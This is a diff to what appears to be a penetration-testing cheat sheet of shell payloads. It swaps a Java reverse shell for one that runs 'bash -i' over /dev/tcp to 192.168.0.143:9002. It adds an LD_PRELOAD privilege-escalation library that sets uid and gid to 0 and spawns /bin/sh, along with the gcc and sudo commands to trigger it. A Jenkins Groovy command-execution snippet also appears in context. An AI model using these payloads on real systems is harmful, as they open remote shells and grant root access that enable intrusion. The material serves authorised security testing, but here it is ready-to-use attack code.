@@ -405,10 +405,20 @@ https://stegcloak.surge.sh/
 
 * java
 ```
-String host="localhost";
-int port=8044;
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class testprog {
+    public static void main(String args[]) {
+        String s;
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.0.143/9002 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
 ```
 
 * jenkins
@@ -420,3 +430,19 @@ proc.consumeProcessOutput(sout, serr)
 proc.waitForOrKill(1000)
 println "out> $sout err> $serr" 
 ```
+
+[ld preload privilege escalation]
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+```
+> gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+> sudo LD_PRELOAD=/tmp/shell.so find
+
